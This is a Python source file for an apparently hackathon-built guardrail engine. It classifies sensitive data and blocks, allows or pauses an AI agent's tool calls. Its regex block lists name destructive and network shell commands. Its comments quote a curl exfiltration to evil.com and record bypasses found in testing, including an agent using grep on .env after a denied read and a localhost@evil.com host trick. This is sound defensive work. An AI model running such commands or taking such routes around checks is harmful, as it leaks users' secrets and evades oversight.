"""
Argox - Policy & Detection Engine
Rule-based (no ML) so it's reliable under demo conditions.

Responsibilities:
1. Tag data with sensitivity labels when it enters the agent (classify_content)
2. Decide whether a tool call should be allowed/blocked/paused (evaluate_call)
"""

import fnmatch
import json
import os
import re
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse


class Tag(str, Enum):
    PII = "pii"
    SECRET = "secret"
    INTERNAL_ONLY = "internal_only"
    USER_UPLOADED = "user_uploaded"
    PUBLIC = "public"


class Decision(str, Enum):
    ALLOW = "allow"
    BLOCK = "block"
    PENDING_CONFIRM = "pending_confirm"


# --- Detection patterns (hackathon-scope: regex/keyword, not ML) ---

EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
PHONE_RE = re.compile(r"\b(\+?\d{1,3}[-.\s]?)?\(?\d{3,4}\)?[-.\s]?\d{3,4}[-.\s]?\d{3,4}\b")
# Common secret-shaped tokens: API keys, bearer tokens, AWS-style keys, generic hex/base64 secrets
SECRET_RE = re.compile(
    r"(sk-[a-zA-Z0-9]{16,}|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z\-_]{35}|"
    r"ghp_[a-zA-Z0-9]{20,}|gsk_[a-zA-Z0-9]{20,}|Bearer\s+[a-zA-Z0-9\-_\.]{20,}|"
    r"[a-fA-F0-9]{32,}|-----BEGIN [A-Z ]+PRIVATE KEY-----)"
)
# SECRET_RE above only recognizes vendor-specific KEY SHAPES (AKIA..., sk-...,
# etc) -- it misses the far more common case of a config/env value simply
# ASSIGNED to a secret-sounding name, e.g. `AWS_SECRET_ACCESS_KEY=wJalr...`
# or `password: hunter2`, which don't match any of those shapes. Found via
# live testing: a config file with exactly that AWS_SECRET_ACCESS_KEY line
# classified as `public` and sailed through to an external call unflagged.
# Keyed on the variable name, not the value's shape, so it catches
# arbitrary secret values -- deliberately permissive (an 8+ char value is
# enough to match) since a missed real secret is worse than an over-tagged
# one. The value charset excludes `$`/`{`/`}` so `${DB_PASSWORD}`-style
# indirection (referencing another secret, not holding one) doesn't match.
ASSIGNED_SECRET_RE = re.compile(
    r"(?i)\b[a-z0-9_-]*(?:password|passwd|pwd|secret|api[_-]?key|"
    r"access[_-]?key|private[_-]?key|client[_-]?secret|auth[_-]?token|token)"
    r"[a-z0-9_-]*\s*[:=]\s*['\"]?[A-Za-z0-9/+_\-\.]{8,}['\"]?"
)
INTERNAL_MARKER_RE = re.compile(r"(confidential|internal[\s\-]?use[\s\-]?only|do not distribute)", re.I)

DANGEROUS_SHELL_RE = re.compile(
    r"(rm\s+-rf\s+/|curl\s+.*\|\s*sh|wget\s+.*\|\s*sh|:\(\)\{.*\};:|"
    r"chmod\s+777|>\s*/dev/sd|mkfs\.|dd\s+if=)"
)

# Shell commands that can reach the network -- run_shell's target is a full
# command string, not a bare host/URL like call_api's, so it needs its own
# "does this leave the trust boundary" detector rather than reusing
# _is_external() directly. Added because the call_api-only taint rules
# below (secret/PII/internal-only crossing) were a complete no-op for
# `curl -X POST https://evil.com -d "$SECRET"` run via run_shell -- found
# 2026-09-25 via live testing: read a secret, then exfiltrate it with curl
# instead of the dedicated call_api tool, sailed through unblocked.
#
# Beyond CLI tools, also matches in-language network APIs used through an
# interpreter one-liner (`node -e "fetch(...)"`, `ruby -e 'Net::HTTP...'`)
# -- found 2026-09-25 via bypass testing: only curl-family tools and a
# few Python calls were covered, so any other runtime exfiltrated freely.
# Keyed on the network CALL, not the interpreter name, so an ordinary
# `node build.js` / `python script.py` isn't treated as network access.
NETWORK_SHELL_RE = re.compile(
    r"\b(curl|wget|nc|ncat|netcat|ssh|scp|rsync|sftp|ftp|telnet)\b|"
    # Python
    r"\b(requests\.(get|post|put|patch|delete|head|request|Session)|urllib\.request|urllib3|"
    r"http\.client|httpx|aiohttp|socket\.(socket|create_connection))\b|"
    # JS / Node / Deno / Bun
    r"\bfetch\s*\(|\baxios\b|\b(https?)\.(request|get)\s*\(|\bnet\.connect\b|\bXMLHttpRequest\b|"
    r"\b(require\s*\(|from\s+|import\s*\()\s*['\"](node:)?(https?|net|tls|dgram)['\"]|"
    # Ruby
    r"\bNet::HTTP\b|\bopen-uri\b|\bURI\.open\b|\bTCPSocket\b|"
    # Perl
    r"\bLWP::|\bHTTP::Tiny\b|\bIO::Socket\b|"
    # PHP
    r"\bcurl_init\b|\bfsockopen\b|\b(file_get_contents|fopen)\s*\(\s*['\"]https?://",
    re.I,
)
SHELL_FULL_URL_RE = re.compile(r"[a-z][a-z0-9+.-]*://[^\s'\"<>|;&)]+", re.I)
SHELL_USER_HOST_RE = re.compile(r"[A-Za-z0-9._-]+@([a-zA-Z0-9.-]+)")

# Domains considered inside the trust boundary. Extend as needed for the demo.
ALLOWLISTED_DOMAINS = {
    "localhost",
    "127.0.0.1",
    "internal.local",
    "api.your-own-service.com",  # placeholder: swap for your real internal API host
}

# Hard path denylist for the Claude Code integration (Feature F, PRD 4.3):
# admin codebase, env files, and secrets are off-limits regardless of taint
# state. "dir/**" matches any path with that directory as a path component;
# a bare glob (no "/") matches against the filename only.
#
# Editable from the UI's Policy tab (backed by policies.json, not this
# constant) -- this list is only the seed used the first time
# policies.json doesn't exist yet, and the fallback if that file is ever
# missing or malformed. A broken/deleted policies.json must never
# silently disable protection.
_DEFAULT_DENY_PATH_PATTERNS = ["admin/**", ".env*", "secrets/**"]

# Independently toggleable rule categories from evaluate_call() below (the
# path denylist above is edited directly as a pattern list, not gated by a
# toggle -- an empty pattern list already means "nothing blocked"). Each
# key gates one taint/shell rule so the Policy tab can turn a category off
# for a demo/debugging session without deleting the underlying pattern data.
_DEFAULT_RULE_TOGGLES = {
    "dangerous_shell_detection": True,
    "secret_exfil_blocking": True,
    "pii_internal_boundary_confirm": True,
    "baseline_external_flagging": True,
}

RULE_TOGGLE_LABELS = {
    "dangerous_shell_detection": "Block dangerous shell commands (rm -rf /, curl | sh, chmod 777, ...)",
    "secret_exfil_blocking": "Block previously-read secrets from being sent to an external API",
    "pii_internal_boundary_confirm": "Require approval before PII or internal-only data crosses the trust boundary",
    "baseline_external_flagging": "Flag (low-risk, still allowed) any untainted call to a new external domain",
}

POLICIES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "policies.json")

_policies_cache = {
    "patterns": list(_DEFAULT_DENY_PATH_PATTERNS),
    "toggles": dict(_DEFAULT_RULE_TOGGLES),
    "mtime": 0,
}


def _ensure_policies_file():
    if not os.path.exists(POLICIES_FILE):
        with open(POLICIES_FILE, "w") as f:
            json.dump(
                {"deny_path_patterns": _DEFAULT_DENY_PATH_PATTERNS, "rule_toggles": _DEFAULT_RULE_TOGGLES},
                f,
                indent=2,
            )


def _reload_if_changed():
    """Hot-reloadable: re-reads policies.json when its mtime changes, so
    the UI's Policy tab can update a long-running hook_server.py process
    without a restart. Toy agent and Claude Code hook both go through
    check_path_denylist()/evaluate_call(), so both front-ends see edits
    made here."""
    _ensure_policies_file()
    try:
        mtime = os.path.getmtime(POLICIES_FILE)
        if mtime != _policies_cache["mtime"]:
            with open(POLICIES_FILE) as f:
                data = json.load(f)
            patterns = data.get("deny_path_patterns")
            if isinstance(patterns, list) and patterns:
                _policies_cache["patterns"] = patterns
            toggles = data.get("rule_toggles")
            if isinstance(toggles, dict):
                merged = dict(_DEFAULT_RULE_TOGGLES)
                merged.update({k: bool(v) for k, v in toggles.items() if k in _DEFAULT_RULE_TOGGLES})
                _policies_cache["toggles"] = merged
            _policies_cache["mtime"] = mtime
    except Exception:
        pass  # keep serving the last-known-good cached state
    return _policies_cache


def get_deny_path_patterns():
    _reload_if_changed()
    return _policies_cache["patterns"]


def get_rule_toggles():
    _reload_if_changed()
    return _policies_cache["toggles"]


def _persist():
    with open(POLICIES_FILE, "w") as f:
        json.dump(
            {"deny_path_patterns": _policies_cache["patterns"], "rule_toggles": _policies_cache["toggles"]},
            f,
            indent=2,
        )
    _policies_cache["mtime"] = os.path.getmtime(POLICIES_FILE)


def set_deny_path_patterns(patterns: list):
    """Persist a new pattern list from the UI. Silently drops non-string/
    empty entries rather than failing the whole write on one bad row."""
    _reload_if_changed()
    clean = [p.strip() for p in patterns if isinstance(p, str) and p.strip()]
    _policies_cache["patterns"] = clean
    _persist()
    return clean


def set_rule_toggles(toggles: dict):
    """Merge a partial or full toggle update from the UI. Unknown keys are
    dropped rather than failing the whole request on one bad entry."""
    _reload_if_changed()
    merged = dict(_policies_cache["toggles"])
    for k, v in (toggles or {}).items():
        if k in _DEFAULT_RULE_TOGGLES:
            merged[k] = bool(v)
    _policies_cache["toggles"] = merged
    _persist()
    return merged


def check_path_denylist(path: str, patterns: list = None):
    """Return a reason string if `path` matches a hard-denylisted pattern,
    else None. Works for both absolute and relative paths.

    patterns: pass explicitly for the hosted multi-tenant backend (fetched
    async from Postgres by the caller, see agent/db.py) -- defaults to the
    local file-backed global for the toy agent / local hook_server.py,
    unchanged from before this was project-scoped."""
    if not path:
        return None
    parts = [p for p in path.replace("\\", "/").split("/") if p]
    basename = parts[-1] if parts else path

    for pattern in (patterns if patterns is not None else get_deny_path_patterns()):
        if pattern.endswith("/**"):
            dirname = pattern[:-3]
            if dirname in parts[:-1]:
                return f"path_denylist:{pattern}"
        elif fnmatch.fnmatch(basename, pattern):
            return f"path_denylist:{pattern}"
    return None


# Catches a denylisted path being referenced INSIDE a shell command (cat,
# grep, find, sed, ...) rather than passed as a tool's own file-path
# argument. Without this, "Read .env" gets denied but "grep ... .env" via
# run_shell sails through evaluate_call() with the same effective outcome
# (found via live testing: Claude Code fell back to `grep`/`find` on .env
# after a direct Read was denied, and that path wasn't covered).
DENY_COMMAND_TOKEN_RE = re.compile(r"(?:^|[\s'\"/])(\.env\S*|admin/|secrets/)", re.I)


def check_command_denylist(command: str):
    """Return a reason string if a shell command string references a
    denylisted path anywhere in it, else None."""
    if not command:
        return None
    match = DENY_COMMAND_TOKEN_RE.search(command)
    if match:
        return f"path_denylist:shell_reference:{match.group(1)}"
    return None


@dataclass
class ClassificationResult:
    tags: set = field(default_factory=set)

    def as_list(self):
        return sorted(t.value for t in self.tags)


@dataclass
class PolicyResult:
    decision: Decision
    risk_score: int
    reasons: list = field(default_factory=list)


def classify_content(text: str, source_hint: str = "") -> ClassificationResult:
    """Tag a piece of content (e.g. a file's contents, an API response body)
    with sensitivity labels. Called at the point data ENTERS the agent."""
    tags = set()
    if not text:
        return ClassificationResult(tags)

    if EMAIL_RE.search(text) or PHONE_RE.search(text):
        tags.add(Tag.PII)
    if SECRET_RE.search(text) or ASSIGNED_SECRET_RE.search(text):
        tags.add(Tag.SECRET)
    if INTERNAL_MARKER_RE.search(text):
        tags.add(Tag.INTERNAL_ONLY)
    if "upload" in source_hint.lower():
        tags.add(Tag.USER_UPLOADED)
    if not tags:
        tags.add(Tag.PUBLIC)
    return ClassificationResult(tags)


def _is_external(target: str) -> bool:
    """Best-effort check: is this tool target (url/path/host) outside the
    trust boundary?"""
    parsed = urlparse(target if "://" in target else f"//{target}")
    host = parsed.hostname or target
    return host not in ALLOWLISTED_DOMAINS


def _shell_call_is_external(command: str) -> bool:
    """Extends _is_external() to a shell command string: does this command
    look like it reaches outside the trust boundary? Only meaningful once
    NETWORK_SHELL_RE has already confirmed the command uses a network tool
    at all -- a plain `ls`/`grep`/`mv` never reaches this.

    Best-effort host extraction (curl/wget URL, or user@host for
    ssh/scp/rsync/sftp); a network tool with no extractable host (`curl
    "$URL"`, `nc $HOST $PORT`, a var-built command) can't be confirmed
    internal, so this conservatively assumes external rather than
    silently trusting it -- same "a miss is worse than a false positive"
    bias ASSIGNED_SECRET_RE documents above."""
    hosts = _shell_command_hosts(command)
    if not hosts:
        return True
    # ANY non-allowlisted host makes the whole command external -- a
    # command naming both localhost and evil.com still reaches evil.com.
    return any(h not in ALLOWLISTED_DOMAINS for h in hosts)


def _shell_command_hosts(command: str) -> list:
    """Every destination host a shell command names. URLs go through
    urlparse() rather than a bare regex capture so userinfo is stripped
    correctly: `https://localhost@evil.com/` is a request to evil.com
    (everything before `@` is credentials), but the old regex captured
    "localhost" from it and treated the exfil as internal -- found
    2026-09-25 via live bypass testing."""
    hosts = []
    for url in SHELL_FULL_URL_RE.findall(command):
        try:
            host = urlparse(url).hostname
        except ValueError:
            host = None
        # Unparseable URL -> can't confirm internal, treat as external.
        hosts.append(host or "")
    # user@host (ssh/scp/rsync/sftp), outside of any URL already handled above
    without_urls = SHELL_FULL_URL_RE.sub(" ", command)
    hosts.extend(m.group(1) for m in SHELL_USER_HOST_RE.finditer(without_urls))
    return hosts


def _crosses_trust_boundary(tool_name: str, target: str) -> bool:
    """Is this call (call_api OR a run_shell command that talks to the
    network) reaching outside the trust boundary? The single check the
    secret/PII/internal-only taint rules below share, so `call_api` and
    "curl in a shell" get identical treatment instead of the latter being
    a free pass -- see NETWORK_SHELL_RE above for why this exists."""
    if tool_name == "call_api":
        return _is_external(target)
    if tool_name == "run_shell" and NETWORK_SHELL_RE.search(target):
        return _shell_call_is_external(target)
    return False


def evaluate_call(
    tool_name: str,
    target: str,
    params: dict,
    inherited_tags: set,
    deny_path_patterns: list = None,
    rule_toggles: dict = None,
) -> PolicyResult:
    """Core policy decision, run BEFORE a tool call executes.

    tool_name: e.g. "call_api", "write_file", "run_shell"
    target: url / path / command string being acted on
    inherited_tags: taint tags propagated from upstream spans in this trace
    deny_path_patterns / rule_toggles: pass explicitly for the hosted
    multi-tenant backend (fetched async from Postgres by the caller, see
    agent/db.py) -- default to the local file-backed globals otherwise, so
    the toy agent and local hook_server.py are unaffected.
    """
    reasons = []
    risk = 0
    toggles = rule_toggles if rule_toggles is not None else get_rule_toggles()

    # 0. Hard path denylist (admin/**, .env*, secrets/**) for direct file
    # access -> block regardless of taint. Mirrors the Claude Code hook's
    # path rule (policy.check_path_denylist) so both front-ends get the
    # same protection -- found via live testing that the toy agent could
    # read .env directly with zero resistance while Claude Code couldn't.
    # Not gated by a toggle: editing the pattern list to empty already
    # turns this off, a second on/off switch would be redundant.
    if tool_name in ("read_file", "write_file"):
        path_reason = check_path_denylist(target, patterns=deny_path_patterns)
        if path_reason:
            return PolicyResult(Decision.BLOCK, 100, [path_reason])

    # 1. Dangerous shell patterns -> always block regardless of taint
    if toggles.get("dangerous_shell_detection", True) and tool_name == "run_shell" and DANGEROUS_SHELL_RE.search(target):
        return PolicyResult(Decision.BLOCK, 100, ["dangerous_shell_pattern"])

    # 1b. Shell command referencing a denylisted path (cat/grep/find on
    # .env/admin/secrets) -> block, same as a direct Read/Edit/Write would be.
    # Also not toggle-gated, same reasoning as rule 0.
    if tool_name == "run_shell":
        command_reason = check_command_denylist(target)
        if command_reason:
            return PolicyResult(Decision.BLOCK, 100, [command_reason])

    # 2. Secret data leaving the boundary -> always block
    # (call_api and network-shelling-out only, via _crosses_trust_boundary
    # -- write_file's target is always a LOCAL filesystem path in this
    # codebase, tools.py's write_file is a plain open(path, "w"), never a
    # network destination. _is_external() misclassified every local path
    # -- relative or absolute -- as "external" since it was written for
    # URLs, so write_file used to trigger these on every single call,
    # including a false BLOCK on a harmless local save whenever taint was
    # active. Found via live testing: routine writes kept showing up
    # "flagged" for no real reason.)
    if toggles.get("secret_exfil_blocking", True) and Tag.SECRET in inherited_tags and _crosses_trust_boundary(tool_name, target):
        return PolicyResult(Decision.BLOCK, 95, ["secret_data_exfil_attempt"])

    # 3. PII crossing the boundary -> pause for confirmation
    if toggles.get("pii_internal_boundary_confirm", True) and Tag.PII in inherited_tags and _crosses_trust_boundary(tool_name, target):
        reasons.append("pii_crossing_trust_boundary")
        risk = max(risk, 70)
        return PolicyResult(Decision.PENDING_CONFIRM, risk, reasons)

    # 4. Internal-only data leaving the boundary -> pause for confirmation
    if toggles.get("pii_internal_boundary_confirm", True) and Tag.INTERNAL_ONLY in inherited_tags and _crosses_trust_boundary(tool_name, target):
        reasons.append("internal_data_crossing_trust_boundary")
        risk = max(risk, 60)
        return PolicyResult(Decision.PENDING_CONFIRM, risk, reasons)

    # 5. Baseline: new/unrecognized external domain, no taint -> allow but flag low risk
    if toggles.get("baseline_external_flagging", True) and tool_name == "call_api" and _is_external(target):
        reasons.append("external_destination_untainted")
        risk = 20

    return PolicyResult(Decision.ALLOW, risk, reasons)
